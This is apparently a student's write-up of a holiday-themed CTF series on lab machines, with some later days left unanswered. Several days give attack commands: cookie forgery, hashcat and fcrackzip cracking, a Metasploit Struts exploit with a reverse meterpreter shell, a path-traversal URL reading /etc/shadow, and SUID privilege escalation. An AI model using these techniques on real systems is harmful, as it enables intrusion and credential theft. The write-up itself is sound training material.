# Day1 Inventory Management 
```
Elves needed a way to submit their inventory - have a web page where they submit their requests and the elf mcinventory can look at what others have submitted to approve their requests. It’s a busy time for mcinventory as elves are starting to put in their orders. mcinventory rushes into McElferson’s office.


I don’t know what to do. We need to get inventory going. Elves can log on but I can’t actually authorise people’s requests! How will the rest start manufacturing what they want.  

McElferson calls you to take a look at the website to see if there’s anything you can do to help. Deploy the machine and access the website at http://<your_machines_ip>:3000 - it can take up to 3 minutes for your machine to boot!
```
## 1. What is the name of the cookie used for authentication?
   - creted id h4ck pass: password email: lovyou@test.com
   - cookie: authid: aDRja3Y0ZXI5bGwxIXNz
## 2. If you decode the cookie, what is the value of the fixed part of the cookie?
the cookie is encoded with base64,to decode it run:
```console
kali@kali:~$ echo "aDRja3Y0ZXI5bGwxIXNz" | base64 -d
h4ckv4er9ll1!ss
```
flag: ```v4er9ll1!ss```
## 3. After accessing his account, what did the user mcinventory request?
we know that the username that we try to gain access = mcinventory so we need to add the prefix part -> ```mcinventoryv4er9ll1!ss```
the cookie is encoded with base64, to encode it run:
```console
kali@kali:~$ echo "mcinventoryv4er9ll1!ss" |base64 
bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw==
```
now we need to change = to %3D which give us -> ```bWNpbnZlbnRvcnl2NGVyOWxsMSFzcw%3D%3D```
flag:```firewall```

# Day 2: Arctic Forum 
```
A big part of working at the best festival company is the social live! The elves have always loved interacting with everyone. Unfortunately, the christmas monster took down their main form of communication - the arctic forum! 

Elf McForum has been sobbing away McElferson's office. How could the monster take down the forum! In an attempt to make McElferson happy, she sends you to McForum's office to help. 

P.S. Challenge may a take up to 5 minutes to boot up and configure!

Access the page at http://[your-ip-here]:3000
```
## What is the path of the hidden page?
use DirBuster to bruteforce directory
```console
$dirbuster& # use wordlist inside /usr/share/wordlists/
```
## What is the password you found?
```html
<h1> Admin Login </h1>
      
          <div class="alert alert-info">Login Failed</div>
      
        <form method="post" action="/sysadmin">
            <div class="form-group">
                <label for="item">Email</label>
                <input type="text" class="form-control" id="username" name="username">
            </div>
            <div class="form-group">
                <label for="item">Password</label>
                <input type="password" class="form-control" id="password" name="password">
            </div>
            <button type="submit" class="btn btn-default">Submit</button>
        </form>
    </div>
    <!--
    Admin portal created by arctic digital design - check out our github repo
    -->
```
check the [github](https://github.com/ashu-savani/arctic-digital-design)
## What do you have to take to the 'partay'
just login to the page using the cerdential we got for github, read and you will find out

# Day 3 Evil Elf
```
An Elf-ministrator, has a network capture file from a computer and needs help to figure out what went on! Are you able to help?

Supporting material for the challenge can be found here!
```
## Whats the destination IP on packet number 998?
Open the pcap with wireshark. select Go -> Go to packet
[link](https://www.wireshark.org/docs/wsug_html_chunked/ChWorkGoToPacketSection.html)

## What item is on the Christmas list?
right click on packet number 998 -> follow -> tcp stream: here is what you will find out
```console
echo 'XXX' > christmas_list.txt
```
```XXX``` is the answer to this question
## Crack buddy's password!
to understand the structure of /etc/shadow read [link](https://linuxize.com/post/etc-shadow-file/)
```buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::```
from the link you will know that $6$ = SHA-512

at the begining I wanted to use john to crack the password but it seeam like john is not working with showdow file... you need to unshadow it first. To be able to unshadow it, you need the passwd + shadow files. 

So after a bit of reasearching. HashCat seem like is the best option for this task [link](https://hkh4cks.com/blog/2018/02/05/password-cracking-tools/#hashcat). LETs do it
```console
kali@kali:~$ nano hash.lst # add the buddy hashed password
kali@kali:~$ cat hash.lst 
buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
kali@kali:~$ hashcat -m 1800 -a 0 -o buddy.txt hash.lst /usr/share/wordlists/rockyou.txt --force
kali@kali:~$ cat buddy.txt 
$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:XXXXXXX
```
find out what ```XXXXXXX``` is. GL

# Day 4: Training 
```
With the entire incident, McElferson has been very stressed.

We need all hands on deck now

To help resolve things faster, she has asked you to help the new intern(mcsysadmin) get familiar with Linux. 
Access the machine via SSH on port 22 using the command

ssh mcsysadmin@[your-machines-ip]

username: mcsysadmin
password: bestelf1234
```

```console
$ ls | wc -l #1
$ cat file5 #2
$ grep -lR "password" #3
$ grep -lRE "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" # find the file that contain ip address
$ grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" fileX #4
$ cat /etc/passwd | grep "/bin/bash" | wc -l #5
$ openssl sha1 file8 #6
$ find / -name "*shadow*" > shadow.txt # find all file name shadow and output it as a shadow.txt
$ cat shadow.txt # and look for the file
$ cat xxx/xxxx.bak # GL fild out what xxx is
```
useful link
1. [regex ip](https://www.putorius.net/grep-an-ip-address-from-a-file.html)

# Day 5: Ho-Ho-Hosint 
```
Elf Lola is an elf-of-interest. Has she been helping the Christmas Monster? lets use all available data to find more information about her! We must protect The Best Festival Company!
```

## What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
A tool call ```exiftool``` can be used to examining img meta data. to install it run ```sudo apt install libimage-exiftool-perl```
```console
kali@kali:~$ exiftool Desktop/thegrinch.jpg 
ExifTool Version Number         : 11.94
File Name                       : thegrinch.jpg
Directory                       : Desktop
File Size                       : 69 kB
File Modification Date/Time     : 2020:05:04 20:05:29-04:00
File Access Date/Time           : 2020:05:04 20:05:29-04:00
File Inode Change Date/Time     : 2020:05:04 20:05:29-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : JLolax1
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275
```
after googling ```JLolax1``` you will find her twitter. You will find her date of birth there.

## What is Lola's current occupation?
occupation = job or profession, lol new word everyday.
You can find the answer on her twitter.

## What phone does Lola make?
check her twitter
## What date did Lola first start her photography? Format: dd/mm/yyyy
In her twitter you will find her web page. To be able to know when she started wiht her hobby we need to get old information/snapshot of her webpage. To do that we need to use [WayBackMachine](https://archive.org/web/). The ```WayBackMachine``` is a digital archive of the World Wide Web. It takes a snapshot of a website and saves it for us to view in the future


You can find the anwer in the fist snapshot of her webpage on https://archive.org/web/. GL
## What famous woman does Lola have on her web page?
save the picture and use the image serach function on https://www.google.com/imghp?hl=en

# Day 6: Data Elf-iltration 
```
"McElferson! McElferson! Come quickly!" yelled Elf-ministrator.

"What is it Elf-ministrator?" McElferson replies.

"Data has been stolen off of our servers!" Elf-ministrator says!

"What was stolen?" She replied.

"I... I'm not sure... They hid it very well, all I know is something is missing" they replied.

"I know just who to call" said McElferson...
```
LEARN [here](https://docs.google.com/document/d/17vU134ZfKiiE-DgiynrO0MySo4_VCGCpw2YJV_Kp3Pk/edit)
## What data was exfiltrated via DNS? 
open the .pcap with wireshark. search for ```UDP``` packet. you will find some udp packet that has some weird HEXdump. Right click on it and select **follow udp flow**. Copy the hexdump and use ```xxd``` get the plain text.
```console
kali@kali:~$ echo "43616e64792043616e652053657269616c204e756d6265722038343931" | xxd -r -p
```
## What did Little Timmy want to be for Christmas?
We learn that you can export http ocject from wirshark. do that! you will. to solve this task, we unzip ```christmaslists.zip```. The file is encrypted. To crack the .zip, we need a tool call 
```console
kali@kali:~$ sudo apt-get install fcrackzip
kali@kali:~$ fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v Downloads/Day6/christmaslists.zip
```
-b specifies brute forcing, --method 2 specifies a Zip file, -D specifies a Dictionary and -V verifies the password is indeed correct


After you get the password
```console
kali@kali:~$ cd Downloads/Day6/
kali@kali:~/Downloads/Day6$ sudo unzip -P december christmaslists.zip 
Archive:  christmaslists.zip
 extracting: christmaslistdan.tx     
  inflating: christmaslistdark.txt   
  inflating: christmaslistskidyandashu.txt  
  inflating: christmaslisttimmy.txt
kali@kali:~/Downloads/Day6$ cat christmaslisttimmy.txt 
```
## What was hidden within the file?
```console
kali@kali:~$ steghide extract -sf Downloads/Day6/TryHackMe.jpg 
Enter passphrase: 
steghide: did not write to file "christmasmonster.txt".
kali@kali:~$ cat christmasmonster.txt
```
some cool stuff I learn on the side, check out [here](https://en.wikipedia.org/wiki/April_Fools%27_Day_Request_for_Comments) and [here](https://tools.ietf.org/html/rfc527)

# Day 7: Skilling Up
```
Previously, we saw mcsysadmin learning the basics of Linux. With the on-going crisis, McElferson has been very impressed and is looking to push mcsysadmin to the security team. One of the first things they have to do is look at some strange machines that they found on their network. 
```
## how many TCP ports under 1000 are open?
```sudo nmap -sS 10.10.37.120```
## What is the name of the OS of the host?
```sudo nmap -O 10.10.37.120```
## What version of SSH is running?
```sudo nmap -sV -p 22 10.10.37.120```
## What is the name of the file that is accessible on the server you found running?
use nmap to scan all port, you will find the answer on port which run http. GL

# Day 8: SUID Shenanigans
```
Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

Deploy and SSH into the machine.
Username: holly
Password: tuD@4vt0G*TU

SSH is not running on the standard port.. You might need to nmap scan the machine to find which port SSH is running on.
nmap <machine_ip> -p <start_port>-<end_port>
```
this one sound FUN !!
READ this [link](https://blog.tryhackme.com/linux-privilege-escalation-suid/)

## What port is SSH running on?
```console
$ sudo nmap -sS -p- 10.10.228.120 # scan all port
$ sudo nmap -sV -p XXX  10.10.228.120 # scan service on specific port
```
## Find and run a file as igor. Read the file /home/igor/flag1.txt
```console
$ ssh holly@ip -p <port> # ssh to the target
$ find / -perm -4000 -exec ls -ldb {} \; > allsuid.txt # find all suid on the machine and output it in a file
$ cat allsuid.txt | grep "igor" # find the suid for Igor 
-rwsr-xr-x 1 igor igor 221768 Feb  7  2016 /usr/bin/find
-rwsr-xr-x 1 igor igor 2770528 Mar 31  2016 /usr/bin/nmap
$ find /home/igor/flag1.txt -XXXX XXX {} \; # now use find to cat the 
```
find out what ```-XXXX XXX``` and you will get the answer.

## Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
I just gonna give a hint here.
```console
cat allsuid.txt | grep "root" 
```
here you will find a werid program in bin that you can run as a root user. by weird means, it is not a normalt program that every linux have and there is no man page for that program when you google it. The program will let you execute a command as a root. GL !!

# Day 9: Requests
```
McSkidy has been going keeping inventory of all the infrastructure but he finds a random web server running on port 3000. All he receives when accessing '/' is

```{"value":"s","next":"f"}```


McSkidy needs to access the next page at /f(which is the value received from the data above) and keep track of the value at each step(in this case 's'). McSkidy needs to do this until the 'value' and 'next' data have the value equal to 'end'.

You can access the machines at the following IP:

    10.10.169.100

Things to note about this challenge:

    The JSON object retrieved will need to be converted from unicode to ASCII(as shown in the supporting material)
    All the values retrieved until the 'end' will be the flag(end is not included in the flag)
```
Read [here](https://docs.google.com/document/d/1FyAnxlQpzh0Cy17cKLsUZYCYqUA3eHu2hm0snilaPL0/edit)

```python
# made by gu2rks@github
import requests
r = requests.get("http://10.10.169.100:3000")
r = r.json()
# {"value":"s","next":"f"}
flag = r["value"]
while True:
    r = requests.get("http://10.10.169.100:3000/"+str(r["next"]))
    r = r.json()
    if r["next"] == "end":
        break
    flag = flag + r["value"]

print("the flag: "+ flag)
```
# Day 10: 


me: 10.8.14.151
target: 10.10.87.246

nmap
```
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 22:38 EDT
[*] Nmap: Nmap scan report for 10.10.87.246
[*] Nmap: Host is up (0.048s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: 80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: 111/tcp open  rpcbind 2-4 (RPC #100000)
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 8.04 seconds
```
## Compromise the web server using Metasploit. What is flag1?
web url = http://10.10.87.246/showcase.action
port80
```console
msf5 post(multi/gather/tomcat_gather) > db_nmap -p 80 -A 10.10.87.246
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 23:07 EDT
[*] Nmap: Nmap scan report for 10.10.87.246
[*] Nmap: Host is up (0.052s latency).
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: |_http-server-header: Apache-Coyote/1.1
[*] Nmap: | http-title: Santa Naughty and Nice Tracker
[*] Nmap: |_Requested resource was showcase.action
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 27.74 seconds
```
nikto use for scan web app vuln
```console
kali@kali:~$ nikto -host 10.10.87.246
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.87.246
+ Target Hostname:    10.10.87.246
+ Target Port:        80
+ Start Time:         2020-05-07 23:05:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: showcase.action
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42
+ /index.action: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
me: 10.8.14.151
```
As you can se the site is vulnerble to [strutshock](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
```console
$ set LHOST <my ip> # set for reverse
$ search strut # search for vuln
$ use 2 # slect vuln
$ set payload linux/x86/meterpreter/reverse_tcp
$ set RHOST <target>
$ set RPOTY <80>
$ set TARGETURL /showcase.action
$ exploit
```
The flag file is call xxxxxFlag1.txt. Good luck finding it. hint ```find / 2>>/dev/null | grep -i "flag"```

## Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
```/home/santa/ssh-creds.txt``` 

## Who is on line 148 of the naughty list?
```console

      \         /   \         /   \         /   \         /
      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
        | ^ ^ |       | o o |       | a a |       | 6 6 |
        |     |       |     |       |     |       |     |
        |     |       |     |       |     |       |     |
        |  Y  |       |  @  |       |  O  |       |  V  |
        `._|_.'       `._|_.'       `._|_.'       `._|_.'
         Dasher        Dancer       Prancer        Vixen
      \         /   \         /   \         /   \         /
      _\/     \/_   _\/     \/_   _\/     \/_   _\/     \/_
       _\-'"'-/_     _\-'"'-/_     _\-'"'-/_     _\-'"'-/_
      (_,     ,_)   (_,     ,_)   (_,     ,_)   (_,     ,_)
        | q p |       | @ @ |       | 9 9 |       | d b |
        |     |       |     |       |     |       |     |
        |     |       |     |       |  _  |       |     |
        | \_/ |       |  V  |       | (_) |       |  0  |
        `._|_.'       `._|_.'       `._|_.'       `._|_.'
         Comet         Cupid         Donder       Blitzen
                           \         /
                           _\/     \/_
                            _\-'"'-/_
                           (_,     ,_)
                             | e e |
                             |     |
                        '-.  |  _  |  .-'
                       --=   |((@))|   =--
                        .-'  `._|_.'  '-.
                             Rudolph
```
so cute
```console
[santa@ip-10-10-166-181 ~]$ ls
naughty_list.txt  nice_list.txt
[santa@ip-10-10-166-181 ~]$ cat -n naughty_list.txt | grep XXX
```
find out what XXX is GL
## Who is on line 52 of the nice list?
```cat -n nice_list.txt | grep XX```
GL
# Elf Applications 
```
McSkidy has been happy with the progress they've been making, but there's still so much to do. One of their main servers has some integral services running, but they can't access these services. Did the Christmas Monster lock them out? 

Deploy the machine and starting scanning the IP. The machine may take a few minutes to boot up.
```
READ [this](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#)
## What is the password inside the creds.txt file?
```console
kali@kali:~$ mkdir Day10NFS
kali@kali:~$ sudo mount -t nfs 10.10.86.177:/ Day10NFS/
kali@kali:~$ cd Day10NFS/opt/files/
kali@kali:~/Day10NFS/opt/files$ cat creds.txt
```
## What is the name of the file running on port 21?
btw you need to be a root to get the file otherwirse it you will keep geting permission deniend 
```console
$ ftp 10.10.86.177 # username anonymous password anonymous
ftp> ls
ftp> binary
ftp> get <thefile>
ftp> exit
$ cat <thefile>
remember to wipe mysql:
root
ff912ABD*
```
## What is the password after enumerating the database?
we got mysql cerdential from the last task. find out more about mysql command click [link](https://gist.github.com/hofmannsven/9164408)
```mysql -h 10.10.86.177 -u root -p``` connect to mysql server. To complete this task use following cmd
```mysql
show databases;
use [database];
show tables;
SELECT * FROM [table];
```
GL

# Day 12 :  Elfcryption 
```
You think the Christmas Monster is intercepting and reading your messages! Elf Alice has sent you an encrypted message. Its your job to go and decrypt it!
```
READ [this](https://docs.google.com/document/d/1xUOtEZOTS_L8u_S5Fbs1Wof7mdpWQrj2NkgWLV9tqns/edit)
## What is the md5 hashsum of the encrypted note1 file?
```console
$ md5sum note1.txt.gpg # check sum
```

## Where was elf Bob told to meet Alice?
```console
$ gpg -d --batch --passphrase 25daysofchristmas note1.txt.gpg
```

## Decrypt note2 and obtain the flag!
```console
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt -out note2.txt
$ cat not2.txt
```

# Day 13 : Accumulate
```
mcsysadmin has been super excited with their new security role, but wants to learn even more. In an attempt to show their l33t skills, they have found a new box to play with. 

This challenge accumulates all the things you've learnt from the previous challenges(that being said, it may be a little more difficult than the previous challenges). Here's the general way to attempt exploitation when just given an IP address:

1. Start out with an NMAP scan to see what services are running
2. Enumerate these services and try exploit them
3. use these exploited services to get an initial access to the host machine
4. enumerate the host machine to elevate privileges

```console
kali@kali:~$ nmap -Pn -A 10.10.182.103
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:22 EDT
Nmap scan report for 10.10.182.103
Host is up (0.048s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-05-12T03:23:07+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-05-11T02:55:18
|_Not valid after:  2020-11-10T02:55:18
|_ssl-date: 2020-05-12T03:23:08+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
```
## A web server is running on the target. What is the hidden directory which the website lives on?
```
kali@kali:~$ ping 10.10.182.103 # ping is not working
PING 10.10.182.103 (10.10.182.103) 56(84) bytes of data.
^C
--- 10.10.182.103 ping statistics ---
131 packets transmitted, 0 received, 100% packet loss, time 133099ms
kali@kali:~$ nmap -Pn 10.10.182.103 # -pn treat the target like it is up, seem like it block icmp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 23:19 EDT
Nmap scan report for 10.10.182.103
Host is up (0.051s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
kali@kali:~$dirbuster& #use wordlist dirbuster2.3 medium
```
you will find you answer by runing the dirbuster.
## Gain initial access and read the contents of user.txt
check all Wade's posts here ```retro/index.php/author/wade/```you will find some vulable info.
hint: you can find the password in a comment -> log in to the page.
if you can log in to the wordpress dashboard page then use the same cerdential and RDP to the server. parzival
## [Optional] Elevate privileges and read the content of root.txt
I saw that we have chrome installed. In bookmark you will see this https://nvd.nist.gov/vuln/detail/CVE-2019-1388.
I saw that there is something in recycle bin, a .exe
After some reseacrh, I found this [writup](https://www.embeddedhacker.com/2019/12/hacking-walkthrough-thm-cyber-of-advent/#day10), and he mention this [gif](https://raw.githubusercontent.com/jas502n/CVE-2019-1388/master/CVE-2019-1388.gif). Follow this and you will be able to get root. MAKE SURE that you use **IE** when open the certificate, I got some eror and needed to restart the whole machine


when you are done that, look around and try to find root.txt. HINT: in ```C:\Users\Admin```
# Day 14 : Unknown Storage 
```
McElferson opens today's news paper and see's the headline

Private information leaked from the best festival company

This shocks her! She calls in her lead security consultant to find out more information about this. How do we not know about our own s3 bucket. 

McSkidy's only starting point is a single bucket name: advent-bucket-one
```
READ [this](https://docs.google.com/document/d/13uHBw3L9wdDAFboErSq_QV8omb3yCol0doo6uMGzJWo/edit#). one of the most easy tasks read it and you will able to solve it
## What is the name of the file you found?
```http://advent-bucket-one.s3.amazonaws.com/```
## What is in the file?
```http://advent-bucket-one.s3.amazonaws.com/somethinghere```
what should in be in "somethinghere"?
# Day 15 : LFI 
```
Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 
```
READ [this](https://blog.tryhackme.com/lfi/)

```console
kali@kali:~$ sudo nmap -A 10.10.21.94
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-12 22:55 EDT
Nmap scan report for 10.10.21.94
Host is up (0.050s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 55:02:84:a1:da:8d:f2:c9:fd:ea:65:56:fe:6a:a6:89 (RSA)
|   256 94:ad:1f:6a:ee:f4:bf:56:7e:6c:ba:1e:d2:92:ec:e6 (ECDSA)
|_  256 c1:5d:32:10:dd:5b:01:25:dd:6b:f4:b5:52:10:c7:29 (ED25519)
80/tcp open  http    Node.js (Express middleware)
|_http-title: Public Notes
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/12%OT=22%CT=1%CU=33422%PV=Y%DS=2%DC=T%G=Y%TM=5EBB61C
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1
OS:1NW6%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   50.36 ms 10.8.0.1
2   49.57 ms 10.10.21.94
```
```js
<script>
      function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
</script>
```

## What is Charlie going to book a holiday to?
http://10.10.21.94/get-file/views%2Fnotes%2Fnote3.txt or just read the page

## Read /etc/shadow and crack Charlies password.
```/etc``` is at the root directory. and we are currently at ```...../get-file/....```. To move back to root terminal we need to do ``cd ..`` multiple times. So my plan is just spam ```..%2F``` like 10 time to make sure that it will end up at the root directory.


this give us ````10.10.21.94/get-file/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow```

now use hashcat
```console
kali@kali:~$ mkdir Day15 && cd Day15
kali@kali:~/Day15$ nano charlie.lst # add the hash
kali@kali:~/Day15$ hashcat -m 1800 -a 0 -o charlie.txt charlie.lst /usr/share/wordlists/rockyou.txt --force
kali@kali:~/Day15$ cat charlie.txt
```
## What is flag1.txt?
just SSH using charlie cerdential and grep the flag1.txt!!
```console
kali@kali:~/Day15$ ssh charlie@10.10.21.94
charlie@ip-10-10-21-94:~$ ls
flag1.txt
charlie@ip-10-10-21-94:~$ cat flag1.txt 
THM{4ea2adf842713ad3ce0c1f05ef12256d}
```

# Day 16 : File Confusion 
```
The Christmas monster got access to some files and made a lot of weird changes. Can you help fix these changes?

Use a (python) script to do the following:
1. extract all the files in the archives 
2. extract metadata from the files 
3. extract text from the files
```
READ [this](https://docs.google.com/document/d/13eYEcqpyp3fIAnaDR8PHz6qibBJJwf2Vp5M77KkEKtw/edit#)

## How many files did you extract(excluding all the .zip files)

## How many files contain Version: 1.1 in their metadata?

## Which file contains the password?

# Day 17 : Hydra-ha-ha-haa 
```
You suspect Elf Molly is communicating with the Christmas Monster. Compromise her accounts by brute forcing them!
```
READ [this](https://blog.tryhackme.com/hydra/)
## Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)

## Use Hydra to bruteforce molly's SSH password. What is flag 2?

# Day 18 : ELF JS 
```
McSkidy knows the crisis isn't over. The best thing to do at this point is OSINT

we need to learn more about the christmas monster

During their OSINT, they came across a Hacker Forum. Their research has shown them that this forum belongs to the Christmas Monster. Can they gain access to the admin section of the forum? They haven't made an account yet so make sure to register.

Access the machine at http://[your-ip-address]:3000 - it may take a few minutes to deploy.
```
READ [this](https://docs.google.com/document/d/19TJ6ANmM-neOln0cDh7TPMbV9rsLkSDKS3nj0eJaxeg/edit#)
## What is the admin's authid cookie value?

# Day 19 : Commands
```
Another day, another hack from the Christmas Monster. Can you get back control of the system?

Access the web server on http://[your-ip]:3000/

McSkidy actually found something interesting on the /api/cmd endpoint.
```
READ [this](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit)

## What are the contents of the user.txt file?

# Day 20 : Cronjob Privilege Escalation 
```
You think the evil Christmas monster is acting on Elf Sam's account!

Hack into her account and escalate your privileges on this Linux machine.
```
## What port is SSH running on?

## Crack sam's password and read flag1.txt

## Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?

# Day 21 : Reverse Elf-ineering 
```
McSkidy has never really touched low level languages - this is something they must learn in their quest to defeat the Christmas monster.

Download the archive and apply the command to the following binary files: chmod +x file-name

Please note that these files are compiled to be executed on Linux x86-64 systems.

The questions below are regarding the challenge1 binary file.
```
READ [this](https://drive.google.com/file/d/1maTcdquyqnZCIcJO7jLtt4cNHuRQuK4x/view?usp=sharing)
## What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?

## What is the value of eax when the imull instruction is called?

## What is the value of local_4h before eax is set to 0?

# Day 22 : If Santa, Then Christmas 
```
McSkidy has been faring on well so far with assembly - they got some inside knowledge that the christmas monster is weaponizing if statements. Can they get ahead of the curve?

These programs have been compiled to be executed on Linux x86-64 systems.
The questions below relate to the if2 binary.
```
READ [this](https://docs.google.com/document/d/1cIHd_YQ_PHhkUPMrEDWAIfQFb9M9ge3OFr22HHaHQOU/edit)
## what is the value of local_8h before the end of the main function?

## what is the value of local_4h before the end of the main function?

# Day 23 : LapLANd (SQL Injection) 
```
Santa’s been inundated with Facebook messages containing Christmas wishlists, so Elf Jr. has taken an online course in developing a North Pole-exclusive social network, LapLANd! Unfortunately, he had to cut a few corners on security to complete the site in time for Christmas and now there are rumours spreading through the workshop about Santa! Can you gain access to LapLANd and find out the truth once and for all?
```
READ [this](https://docs.google.com/document/d/15XH_T1o6FLvnV19_JnXdlG2A8lj2QtepXMtVQ32QXk0/edit)
## Which field is SQL injectable? Use the input name used in the HTML code.

## What is Santa Claus' email address?

## What is Santa Claus' plaintext password?

## Santa has a secret! Which station is he meeting Mrs Mistletoe in?

## Once you're logged in to LapLANd, there's a way you can gain a shell on the machine! Find a way to do so and read the file in /home/user/

# Day 24 : Elf Stalk 
```
